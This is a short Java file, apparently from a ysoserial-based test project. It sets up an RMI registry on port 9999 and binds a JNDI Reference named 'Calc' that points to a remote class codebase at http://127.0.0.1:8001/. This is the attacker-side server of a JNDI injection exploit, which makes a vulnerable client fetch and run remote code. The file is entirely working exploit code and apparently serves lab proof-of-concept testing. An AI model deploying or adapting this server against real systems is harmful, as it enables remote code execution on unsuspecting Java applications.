package ysoserial.Test;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import ysoserial.payloads.util.Gadgets;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) {
        try {
            //获取远程注册中心
            Registry registry =LocateRegistry.createRegistry(9999);
//            Gadgets.createProxy(Gadgets.createMemoizedInvocationHandler(Gadgets.createMap()), iface, ifaces)
            Reference reference = new Reference("Calc","Calc","http://127.0.0.1:8001/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("Calc",referenceWrapper);
            System.out.println("open port for rmi for 9999:Calc");
        } catch (RemoteException | NamingException e) {
            throw new RuntimeException(e);
        } catch (AlreadyBoundException e) {
            throw new RuntimeException(e);
        }
    }
}
